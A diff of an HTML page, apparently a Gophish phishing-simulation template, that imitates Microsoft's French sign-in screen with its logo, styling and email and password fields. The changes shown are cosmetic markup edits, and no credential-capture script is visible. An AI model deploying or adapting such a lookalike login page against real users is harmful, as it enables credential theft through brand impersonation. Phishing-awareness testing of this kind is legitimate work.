@@ -1,179 +1,177 @@
-<!DOCTYPE html><html lang="fr"><head>
-    <meta charset="utf-8"/>
-    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1"/>
-    <title>Se connecter</title>
-    <link rel="shortcut icon" href="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/logo-micro-1.png"/>
-    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"/>
-    <style>
-        @font-face {
-            font-family: 'Segoe UI';
-            src: local('Segoe UI'), local('SegoeUI'), url('https://fonts.cdnfonts.com/css/segoe-ui');
-        }
-        body {
-            margin: 0;
-            background: #f2f2f2;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        .login-container {
-            background: white;
-            padding: 40px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            width: 100%;
-            text-align: left;
-        }
-        .login-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 30px;
-        }
-        .login-header img {
-            width: 24px;
-            height: 24px;
-            margin-right: 8px;
-        }
-        .login-header h2 {
-            font-size: 24px;
-            font-weight: 600;
-            margin: 0;
-            color: #1b1b1b;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        .form-control {
-            border: none;
-            border-bottom: 1px solid #ccc;
-            border-radius: 0;
-            padding: 10px 0;
-            font-size: 16px;
-            width: 100%;
-            box-sizing: border-box;
-        }
-        .form-control:focus {
-            border-bottom: 2px solid #0078d4;
-            outline: none;
-        }
-        .form-control.error {
-            border-bottom: 2px solid #e81123;
-        }
-        .error-message {
-            color: #e81123;
-            font-size: 14px;
-            margin-top: 5px;
-            display: none;
-        }
-        .button-container {
-            display: flex;
-            justify-content: flex-end;
-            margin-top: 20px;
-        }
-        .btn-next {
-            background: #0067b8;
-            color: white;
-            border: none;
-            border-radius: 0;
-            padding: 8px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            width: 100px;
-        }
-        .btn-next:hover {
-            background: #005da6;
-        }
-        .horizontal-links {
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        .horizontal-links a {
-            color: #0067b8;
-            text-decoration: none;
-        }
-        .horizontal-links a:hover {
-            text-decoration: underline;
-        }
-        .forgot-password-link {
-            display: none;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-        .forgot-password-link a {
-            color: #0067b8;
-            text-decoration: none;
-        }
-        .connection-options {
-            background: white;
-            border: 1px solid #ccc;
-            padding: 12px;
-            margin-top: 20px;
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-        }
-        .connection-options:hover {
-            background: #f9f9f9;
-        }
-        .connection-options img {
-            width: 20px;
-            margin-right: 10px;
-        }
-        .connection-options a {
-            color: #1b1b1b;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-        }
-        #password, #password-error {
-            display: none;
-        }
-        .email-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        .back-button {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            border: none;
-            background: url('https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/main/Picture-Template/fleche_mdp.svg') no-repeat center;
-            background-size: 16px;
-            cursor: pointer;
-            margin-right: 10px;
-        }
-        .email-display {
-            font-size: 16px;
-            color: #1b1b1b;
-            margin-left: 10px;
-        }
-    </style>
-</head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Se connecter</title>
+<link rel="shortcut icon" href="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/logo-micro-1.png">
+<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+<style>
+    @font-face {
+        font-family: 'Segoe UI';
+        src: local('Segoe UI'), local('SegoeUI'), url('https://fonts.cdnfonts.com/css/segoe-ui');
+    }
+    body {
+        margin: 0;
+        background: #f2f2f2;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    .login-container {
+        background: white;
+        padding: 40px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        max-width: 400px;
+        width: 100%;
+        text-align: left;
+    }
+    .login-header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 30px;
+    }
+    .login-header img {
+        width: 24px;
+        height: 24px;
+        margin-right: 8px;
+    }
+    .login-header h2 {
+        font-size: 24px;
+        font-weight: 600;
+        margin: 0;
+        color: #1b1b1b;
+    }
+    .form-group {
+        margin-bottom: 20px;
+    }
+    .form-control {
+        border: none;
+        border-bottom: 1px solid #ccc;
+        border-radius: 0;
+        padding: 10px 0;
+        font-size: 16px;
+        width: 100%;
+        box-sizing: border-box;
+    }
+    .form-control:focus {
+        border-bottom: 2px solid #0078d4;
+        outline: none;
+    }
+    .form-control.error {
+        border-bottom: 2px solid #e81123;
+    }
+    .error-message {
+        color: #e81123;
+        font-size: 14px;
+        margin-top: 5px;
+        display: none;
+    }
+    .button-container {
+        display: flex;
+        justify-content: flex-end;
+        margin-top: 20px;
+    }
+    .btn-next {
+        background: #0067b8;
+        color: white;
+        border: none;
+        border-radius: 0;
+        padding: 8px 20px;
+        font-size: 16px;
+        cursor: pointer;
+        width: 100px;
+    }
+    .btn-next:hover {
+        background: #005da6;
+    }
+    .horizontal-links {
+        margin-top: 20px;
+        font-size: 14px;
+    }
+    .horizontal-links a {
+        color: #0067b8;
+        text-decoration: none;
+    }
+    .horizontal-links a:hover {
+        text-decoration: underline;
+    }
+    .forgot-password-link {
+        display: none;
+        margin-top: 10px;
+        font-size: 14px;
+    }
+    .forgot-password-link a {
+        color: #0067b8;
+        text-decoration: none;
+    }
+    .connection-options {
+        background: white;
+        border: 1px solid #ccc;
+        padding: 12px;
+        margin-top: 20px;
+        display: flex;
+        align-items: center;
+        cursor: pointer;
+    }
+    .connection-options:hover {
+        background: #f9f9f9;
+    }
+    .connection-options img {
+        width: 20px;
+        margin-right: 10px;
+    }
+    .connection-options a {
+        color: #1b1b1b;
+        text-decoration: none;
+        display: flex;
+        align-items: center;
+    }
+    #password, #password-error {
+        display: none;
+    }
+    .email-header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 20px;
+    }
+    .back-button {
+        width: 24px;
+        height: 24px;
+        border-radius: 50%;
+        border: none;
+        background: url('https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/main/Picture-Template/fleche_mdp.svg') no-repeat center;
+        background-size: 16px;
+        cursor: pointer;
+        margin-right: 10px;
+    }
+    .email-display {
+        font-size: 16px;
+        color: #1b1b1b;
+        margin-left: 10px;
+    }
+</style>
 <body>
     <div class="login-container">
         <div class="login-header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo"/>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
             <h2>Se connecter</h2>
         </div>
 
-        <form autocomplete="off" action="">
+        <form autocomplete="off">
             <div class="form-group">
                 <span class="error-message" id="email-error">Entrez une adresse e-mail, un numéro de téléphone ou un identifiant Skype valide.</span>
-                <input type="email" class="form-control" id="email" placeholder="E-mail, téléphone ou identifiant Skype" required=""/>
+                <input type="email" class="form-control" id="email" placeholder="E-mail, téléphone ou identifiant Skype" required>
             </div>
 
             <div class="form-group">
                 <span class="error-message" id="password-error">Veuillez saisir votre mot de passe.</span>
-                <input type="password" class="form-control" id="password" placeholder="Mot de passe" required=""/>
+                <input type="password" class="form-control" id="password" placeholder="Mot de passe" required>
             </div>
 
             <div class="connection-options">
                 <a href="#">
-                    <img src="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/key-2.png" alt="Options de connexion"/>
+                    <img src="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/key-2.png" alt="Options de connexion">
                     <span>Options de connexion</span>
                 </a>
             </div>
@@ -276,5 +274,4 @@
             }
         }
     </script>
-
-</body></html>
+</body>
